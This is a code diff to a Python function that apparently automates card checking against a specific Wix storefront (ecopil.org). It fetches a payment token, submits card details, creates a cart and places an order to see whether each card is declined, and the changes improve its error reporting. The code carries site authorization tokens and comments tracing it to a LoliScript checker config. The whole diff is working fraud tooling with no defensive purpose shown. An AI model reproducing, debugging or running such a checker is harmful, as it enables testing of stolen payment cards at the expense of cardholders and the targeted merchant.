@@ -493,14 +493,12 @@ def procesar_tarjeta_wix(linea_cc):
 
         resp_token = session.post(url_token, headers=headers_token, json=content_token, timeout=15)
         
-        # Validar errores personalizados del LoliScript
         if "Unexpected Payments exception" in resp_token.text or "Could not parse JSON" in resp_token.text:
             return False, "Unexpected Payments exception / JSON Error"
 
-        # #token PARSE
         match_token = re.search(r'\{"token":\{"token":"([^"]+)"', resp_token.text)
         if not match_token:
-            return False, "No se pudo obtener el token de pago"
+            return False, f"Error token: {resp_token.text[:80]}"
         token_cc = match_token.group(1)
 
         # 2. #idd2 y #get_visitor_id
@@ -524,7 +522,6 @@ def procesar_tarjeta_wix(linea_cc):
         url_v2 = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
         headers_v2 = {
             "Host": "www.ecopil.org",
-            "Content-Length": "443",
             "X-Wix-Brand": "wix",
             "Sec-Ch-Ua-Platform": "\"Windows\"",
             "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
@@ -567,15 +564,16 @@ def procesar_tarjeta_wix(linea_cc):
             }
         }
         resp_v2 = session.post(url_v2, headers=headers_v2, json=content_v2, timeout=15)
+        
+        # Capturar el error exacto que responde Wix si falla
         detailsId = resp_v2.json().get("detailsId")
         if not detailsId:
-            return False, "Error al obtener detailsId"
+            return False, f"Detalle error v2: {resp_v2.text[:100]}"
 
         # 5. #CARRO_TOKEN
         url_cart = "https://www.ecopil.org/_api/cart-v2/v2/carts"
         headers_cart = {
             "Host": "www.ecopil.org",
-            "Content-Length": "309",
             "X-Wix-Brand": "wix",
             "Authorization": "123OCk2g0S7I1_FxdtAtT4koSXTbgEzOKzBloI1XOS8.eyJpbnN0YW5jZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwiYXBwRGVmSWQiOiIyMmJlZjM0NS0zYzViLTRjMTgtYjc4Mi03NGQ0MDg1MTEyZmYiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA1VDAwOjA0OjIxLjA5NFoiLCJkZW1vTW9kZSI6ZmFsc2UsImFpZCI6ImYxODViZjhkLWZmMzQtNGYxYi1iMGVmLTVlMDM1MTgwZTU1ZiIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIiwic3MiOmZhbHNlfQ",
             "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%224d432572-9526-4dab-b1e7-b4f017dd0b50%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
@@ -610,17 +608,16 @@ def procesar_tarjeta_wix(linea_cc):
         
         match_carro = re.search(r'\{"id":"([^"]+)"', resp_cart.text)
         if not match_carro:
-            return False, "Error al crear carrito"
+            return False, f"Error carro: {resp_cart.text[:80]}"
         CARROTOK = match_carro.group(1)
 
         # 6. #TESTEAR_CC (PLACE ORDER)
         url_place = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{CARROTOK}/place-order"
         headers_place = {
             "Host": "www.ecopil.org",
-            "Content-Length": "2522",
             "X-Time-Budget": "30000",
             "X-Wix-Bi-Gateway": "environment=js-sdk,package-name=@wix/auto_sdk_ecom_cart-v-2,method-fqn=wix.ecom.cart.v2.CartService.PlaceOrder,entity=wix.ecom.v2.cart",
-            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
+            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZdafZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
             "X-Wix-Linguist": "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4",
             "Content-Type": "application/json",
@@ -651,7 +648,6 @@ def procesar_tarjeta_wix(linea_cc):
         resp_place = session.post(url_place, headers=headers_place, json=payload_place, timeout=20)
         source_text = resp_place.text
 
-        # KeyCheck del LoliScript
         if "description\":\"Invalid payment status: DECLINED\"" in source_text or "DECLINED" in source_text:
             msg_fail = "Declined"
             try:
